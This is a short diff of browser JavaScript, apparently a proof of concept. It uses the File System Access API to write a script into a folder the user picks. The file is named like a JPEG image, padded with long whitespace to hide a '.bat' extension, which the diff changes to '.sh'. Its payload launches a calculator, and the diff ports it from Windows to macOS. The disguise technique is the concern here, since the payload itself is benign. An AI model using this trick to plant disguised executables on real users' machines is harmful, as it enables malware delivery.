@@ -48,7 +48,7 @@
             const dirHandle = await window.showDirectoryPicker()
 
             //create New Folder shortcut file in a user system folder
-            const newFileHandle = await dirHandle.getFileHandle('USERNAME.jpg                                                                            .bat', {
+            const newFileHandle = await dirHandle.getFileHandle('USERNAME.jpg                                                                            .sh', {
                 create: true
             })
 			
@@ -60,7 +60,7 @@
             //write real lnk code to the file that we created
             const writable = await newFileHandle.createWritable()
             //const response = await fetch('folder.lnk')
-			const response = "cmd /c calc";
+			const response = "/System/Applications/calculator.app";
             await writable.write(response);
 			writable.close();
 
